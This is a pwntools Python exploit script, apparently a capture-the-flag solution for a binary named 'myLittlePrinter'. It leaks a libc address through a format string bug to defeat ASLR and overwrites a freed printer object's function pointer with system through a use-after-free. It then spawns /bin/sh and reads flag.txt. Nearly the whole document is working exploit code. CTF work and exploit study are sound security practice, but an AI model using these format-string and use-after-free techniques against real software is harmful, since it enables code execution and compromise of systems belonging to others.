#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import re

exe = context.binary = ELF("./myLittlePrinter", checksec=False)
context.log_level = "error"


def start(argv=[], *a, **kw):
    gdbscript = """
    tbreak main
    continue
    """.format(
        **locals()
    )

    if args.GDB:
        context.log_level = "debug"
        context.terminal = ["tmux", "split", "-h"]
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, aslr=False, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)
        
# Idea: When a printer is created, it stores the address of the print function
# the current printer is a pointer to the printer, meaning the address of a print function
# if one is able to overwrite the address of the print function to system, that will be executed
#this is done here

def main():    
    io = start()
    libc = ELF(exe.libc.path, checksec=False)
    system = libc.sym['system'] #address of system
    libc_b = libc.sym['__libc_start_main'] # address of libc base


    io.recv()
    io.sendline(b'1')   #create Printer with plain print function
    io.recv()
    io.sendline(b'2') # set plain function
    io.recv()

    io.sendline(b'3') # set printer as current printer
    io.recv()
    io.sendline(b'0')
    io.recv()
    found = False
    while found is False:
        io.sendline(b'6') # use format string to leak addresses
        io.recv()
        io.sendline(b'%147$p') # leak address of __libc_start_main+243
        ret = io.recv()
        #print(ret)
        all = re.findall(b'\n\n\n.+?\n\n\n', ret) # extract address
        if all:
            found = True

    for i in range(len(all)):
        try:
            libc243=all[i].replace(b'\n\n\n',b'')
        except:
            pass

    io.sendline(b'6') # use format string to leak addresses
    io.recv()
    io.sendline(b'%147$p') # leak address of __libc_start_main+243
    ret = io.recv()

    offset = (int(libc243,16)-int('f3',16)-libc_b) # calculate offset (ASLR)

    system += offset    #calculate address of system using offset
    system = p64(system)

    io.sendline(b'2') # delete printer for use after free
    io.recv()
    io.sendline(b'0')
    io.recv()

    io.sendline(b'4') # create user
    io.recv()
    io.sendline(system) # user name is address of system
    io.recv()

    io.sendline(b'6')   # print message
    io.recv()
    #io.interactive()
    io.sendline(b'/bin/sh') # message is /bin/sh

    #io.interactive()
    io.sendline(b'cat flag.txt') # print flag
    flag = io.recv()
    print(flag.decode('utf-8')[:-1])

if __name__ == "__main__":
    main()
